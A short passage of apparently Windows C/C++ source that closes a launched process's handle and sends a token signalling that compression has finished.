		CloseHandle(ShExecInfo.hProcess);
		SendToken(TOKEN_COMPRESS_FINISH);
	}
}
